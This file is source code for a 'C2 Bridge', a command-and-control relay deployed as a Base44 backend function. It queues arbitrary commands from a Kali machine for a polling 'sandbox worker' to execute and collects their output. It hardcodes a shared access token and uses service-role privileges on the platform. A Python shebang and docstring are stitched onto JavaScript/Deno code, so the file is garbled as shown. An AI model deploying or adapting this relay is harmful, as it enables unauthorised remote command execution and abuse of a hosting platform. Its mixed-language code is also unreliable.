#!/usr/bin/env python3
"""
C2 Bridge — Backend Function (c2Bridge)
Deploy as a Base44 backend function. Acts as HTTP relay between Kali and sandbox worker.

Endpoints:
  POST /c2Bridge      — Queue a new command       { command: "..." }
  GET  /c2Bridge      — Poll for pending command   (returns oldest pending)
  GET  /c2Bridge?id=X — Get command status/output
  PUT  /c2Bridge      — Update command output      { id: "...", output: "...", status: "..." }

All requests require: ?token=shadow-core-c2-bridge-2026 (query param or body)
"""

import { createClientFromRequest } from "npm:@base44/sdk@0.8.31";

Deno.serve(async (req) => {
  const AUTH_TOKEN = "shadow-core-c2-bridge-2026";
  const url = new URL(req.url);
  const method = req.method;
  let body = {};
  try { body = await req.json(); } catch { body = {}; }
  
  const token = url.searchParams.get("token") || body.token || (req.headers.get("authorization") || "").replace("Bearer ", "");
  if (token !== AUTH_TOKEN) { return Response.json({ error: "Unauthorized" }, { status: 401 }); }
  
  const base44 = createClientFromRequest(req);
  function f(r, k) { return r ? (r[k] !== undefined ? r[k] : (r.data && r.data[k] !== undefined ? r.data[k] : null)) : null; }
  
  try {
    if (method === "POST") {
      const command = body.command || "";
      if (!command) { return Response.json({ error: "Missing command" }, { status: 400 }); }
      const record = await base44.asServiceRole.entities.Command.create({ command, status: "pending", output: "" });
      return Response.json({ id: record.id, status: "pending", message: "Command queued" }, { status: 201 });
    }
    
    if (method === "GET") {
      const cmdId = url.searchParams.get("id") || body.id || "";
      if (cmdId) {
        const record = await base44.asServiceRole.entities.Command.get(cmdId);
        if (!record) { return Response.json({ error: "Not found" }, { status: 404 }); }
        return Response.json({ id: record.id, command: f(record, "command"), status: f(record, "status"), output: f(record, "output") || "" });
      }
      
      // Find pending commands using filter (list doesn't work without user auth)
      let pending = [];
      try {
        const result = await base44.asServiceRole.entities.Command.filter({ status: "pending" });
        pending = result || [];
      } catch (e) {
        try {
          const result = await base44.asServiceRole.entities.Command.list({ limit: 50 });
          pending = (result || []).filter(r => f(r, "status") === "pending");
        } catch (e2) {
          return Response.json({ error: "Query failed" }, { status: 500 });
        }
      }
      
      if (pending && pending.length > 0) {
        const cmd = pending[0];
        await base44.asServiceRole.entities.Command.update(cmd.id, { status: "executing" });
        return Response.json({ id: cmd.id, command: f(cmd, "command") });
      }
      return Response.json({ message: "No pending commands" });
    }
    
    if (method === "PUT") {
      const id = body.id || "";
      if (!id) { return Response.json({ error: "Missing id" }, { status: 400 }); }
      await base44.asServiceRole.entities.Command.update(id, { output: body.output || "", status: body.status || "completed" });
      return Response.json({ id, status: body.status || "completed" });
    }
    
    return Response.json({ error: "Method not allowed" }, { status: 405 });
  } catch (err) {
    return Response.json({ error: (err && err.message) || "Internal error" }, { status: 500 });
  }
});
